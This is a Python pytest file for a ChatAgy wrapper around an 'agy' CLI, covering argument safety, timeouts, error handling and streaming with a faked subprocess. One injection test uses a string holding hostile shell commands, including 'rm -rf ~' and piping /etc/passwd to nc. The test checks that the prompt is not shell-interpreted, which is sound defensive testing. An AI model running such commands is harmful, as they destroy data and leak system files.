"""ChatAgy beyond tests/test_agy_chat.py: argument safety, timeouts, failure modes, tool wiring
and streaming. subprocess.run is faked in every test; the real `agy` binary never runs."""

import json
import subprocess

import pytest
from langchain_core.messages import HumanMessage, SystemMessage, ToolMessage

import agents.graph_builder as graph_builder
from agy_chat import ChatAgy
from tools.quest_status_tool import quest_status

FALLBACK_MARKERS = ("my mind wandered", "my thoughts wandered")


def assert_not_fallback(text: str) -> None:
    for marker in FALLBACK_MARKERS:
        assert marker not in text.lower(), f"got a canned fallback line: {text!r}"


class FakeRun:
    """Records every subprocess.run call and replies with a scripted result."""

    def __init__(self, stdout="", returncode=0, stderr="", raises=None):
        self.stdout, self.returncode, self.stderr, self.raises = stdout, returncode, stderr, raises
        self.calls: list[tuple[object, dict]] = []

    def __call__(self, cmd, **kwargs):
        self.calls.append((cmd, kwargs))
        if self.raises is not None:
            raise self.raises
        return subprocess.CompletedProcess(args=cmd, returncode=self.returncode, stdout=self.stdout, stderr=self.stderr)


def reply(text: str) -> str:
    return json.dumps({"response": text})


@pytest.fixture
def fake_run(monkeypatch):
    def install(**kwargs) -> FakeRun:
        fake = FakeRun(**kwargs)
        monkeypatch.setattr(subprocess, "run", fake)
        return fake

    return install


HOSTILE = "What's in `ls`? $(rm -rf ~); echo 'hi' && cat /etc/passwd | nc x 1 > out\n\"quoted\" ;* ? [a] {b} \\ \t end"


def test_a_prompt_full_of_shell_metacharacters_travels_as_one_argument(fake_run):
    fake = fake_run(stdout=reply("Aye."))
    ChatAgy(binary="agy", timeout_s=60).invoke([HumanMessage(content=HOSTILE)])

    (cmd, kwargs), = fake.calls
    assert isinstance(cmd, list), "the command must be an argument list, never a shell string"
    assert kwargs.get("shell", False) is False
    assert cmd == ["agy", "-p", "Human: " + HOSTILE, "--output-format", "json", "--print-timeout", "60s"]


def test_a_prompt_that_looks_like_a_flag_stays_the_value_of_p(fake_run):
    fake = fake_run(stdout=reply("Aye."))
    ChatAgy().invoke([SystemMessage(content="--model evil")])
    (cmd, _), = fake.calls
    assert cmd[1:3] == ["-p", "System: --model evil"]
    assert cmd.count("--model") == 0


@pytest.mark.parametrize(
    "model, want_tail",
    [
        pytest.param(None, ["--print-timeout", "120s"], id="no model configured adds no --model"),
        pytest.param("", ["--print-timeout", "120s"], id="an empty model name adds no --model"),
        pytest.param("gemini-3.5-flash", ["--print-timeout", "120s", "--model", "gemini-3.5-flash"],
                     id="a configured model is passed last as --model"),
    ],
)
def test_model_flag_only_when_configured(fake_run, model, want_tail):
    fake = fake_run(stdout=reply("Aye."))
    ChatAgy(model=model).invoke("Hello")
    (cmd, _), = fake.calls
    assert cmd[-len(want_tail):] == want_tail
    assert cmd.count("--model") == (1 if model else 0)


@pytest.mark.parametrize(
    "timeout_s, print_timeout, subprocess_timeout",
    [
        pytest.param(1, "1s", 31, id="one second gets a 31-second subprocess limit"),
        pytest.param(120, "120s", 150, id="the default 120 seconds gets 150"),
        pytest.param(600, "600s", 630, id="ten minutes gets ten and a half"),
    ],
)
def test_subprocess_timeout_is_cli_timeout_plus_30s(fake_run, timeout_s, print_timeout, subprocess_timeout):
    fake = fake_run(stdout=reply("Aye."))
    ChatAgy(timeout_s=timeout_s).invoke("Hello")
    (cmd, kwargs), = fake.calls
    assert cmd[cmd.index("--print-timeout") + 1] == print_timeout
    assert kwargs["timeout"] == subprocess_timeout
    assert kwargs["capture_output"] is True and kwargs["text"] is True


@pytest.mark.parametrize(
    "run_kwargs, error, match",
    [
        pytest.param(dict(returncode=1, stdout=reply("I should not be used."), stderr="quota exceeded"),
                     RuntimeError, r"exit code 1: quota exceeded",
                     id="a non-zero exit raises even when stdout holds a reply"),
        pytest.param(dict(returncode=0, stdout=""), RuntimeError, r"Failed to parse agy JSON output",
                     id="empty output raises"),
        pytest.param(dict(returncode=0, stdout=json.dumps({"text": "Aye."})), RuntimeError,
                     r"Failed to parse agy JSON output.*'response'",
                     id="JSON without a response field raises"),
        pytest.param(dict(returncode=0, stdout=json.dumps(["Aye."])), RuntimeError,
                     r"Failed to parse agy JSON output", id="a JSON list instead of an object raises"),
        pytest.param(dict(raises=subprocess.TimeoutExpired(cmd="agy", timeout=150, stderr=None)),
                     RuntimeError, r"timed out after 150s \(stderr: ''\)",
                     id="a timeout with no stderr raises"),
        pytest.param(dict(raises=FileNotFoundError(2, "No such file or directory", "agy")),
                     RuntimeError, r"Failed to execute agy binary 'agy'",
                     id="a missing binary raises"),
        pytest.param(dict(returncode=0, stdout=json.dumps({"response": None})), RuntimeError, r"agy returned no text",
                     id="a null response raises rather than replying with nothing"),
    ],
)
def test_failures_raise_instead_of_returning_an_empty_reply(fake_run, run_kwargs, error, match):
    fake_run(**run_kwargs)
    with pytest.raises(error, match=match):
        ChatAgy().invoke("Hello")


def test_stderr_in_the_error_is_cut_to_500_characters(fake_run):
    fake_run(returncode=2, stderr="E" * 499 + "FG" + "H" * 100)
    with pytest.raises(RuntimeError) as exc_info:
        ChatAgy().invoke("Hello")
    message = str(exc_info.value)
    assert message == "agy process failed with exit code 2: " + "E" * 499 + "F"


@pytest.mark.parametrize("text", ["", "   \n"])
def test_an_empty_response_field_raises(fake_run, text):
    # Exit 0 with no text is a failed generation, reported like every other agy failure.
    fake_run(stdout=reply(text))
    with pytest.raises(RuntimeError, match=r"agy returned no text"):
        ChatAgy().invoke("Hello")


def test_other_message_types_are_labelled_by_their_type(fake_run):
    fake = fake_run(stdout=reply("Aye."))
    ChatAgy().invoke([HumanMessage(content="Hi"), ToolMessage(content="quest step 2", tool_call_id="t1")])
    (cmd, _), = fake.calls
    assert cmd[2] == "Human: Hi\n\nTool: quest step 2"


def test_bind_tools_fails_when_the_quest_agent_is_built(monkeypatch):
    monkeypatch.setattr(graph_builder, "llm_heavy", ChatAgy())
    with pytest.raises(NotImplementedError, match=r"does not support tool calling"):
        graph_builder.build_langgraph_agent("You are Elara.", [quest_status])


def test_streaming_yields_the_whole_reply_in_one_piece(fake_run):
    fake = fake_run(stdout=reply("The Sunstone was lost in the flood of the third age."))
    chunks = [c.content for c in ChatAgy().stream([HumanMessage(content="What is the Sunstone?")])]
    assert chunks == ["The Sunstone was lost in the flood of the third age."]
    assert_not_fallback(chunks[0])
    assert len(fake.calls) == 1
